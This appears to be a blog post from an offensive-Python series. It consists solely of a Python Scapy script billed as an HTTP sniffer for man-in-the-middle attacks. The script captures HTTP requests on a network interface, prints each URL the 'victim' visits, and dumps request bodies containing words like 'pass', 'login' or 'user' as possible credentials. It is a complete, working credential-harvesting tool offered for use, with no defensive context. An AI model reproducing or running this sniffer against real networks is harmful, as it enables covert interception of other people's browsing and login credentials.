---
layout: single
title: HTTP Sniffer - Python
excerpt: "HTTP Sniffer (MITM Attack)."
date: 2025-03-16
classes: wide
header:
  teaser: /img2/images/python.jpg"
  teaser_home_page: true
  icon: /img2/python.ico
categories:
  - Python
  - Scripts
tags:
  - Python Ofensivo
  - MITM
---

```python
import scapy.all as scapy
import signal
import sys
from scapy.layers import http
from termcolor import colored


def def_handler(sig,frame):
  print(colored(f"\n[!] Saliendo...\n", 'red'))
  sys.exit(1)

signal.signal(signal.SIGINT, def_handler) 

def process_packet(packet): 
  cred_keywords=["pass", "login","user","mail"] 

  if packet.haslayer(http.HTTPRequest): 
    url= "http://" + packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode() 
    print(colored(f"[+] URL viistada por la víctima: {url}", 'blue'))

    if packet.haslayer(scapy.Raw): 
      try:
        response=packet[scapy.Raw].load.decode()
        for keyword in cred_keywords: 
          if keyword in response: 
            print(colored(f"\n[+] Posibles credenciales: {response}","green"))
            break
      except:
        pass


def sniff(interface):
  scapy.sniff(iface=interface, prn=process_packet, store=0)


def main():
  sniff("ens33")


if __name__ == '__main__':
  main()
  ```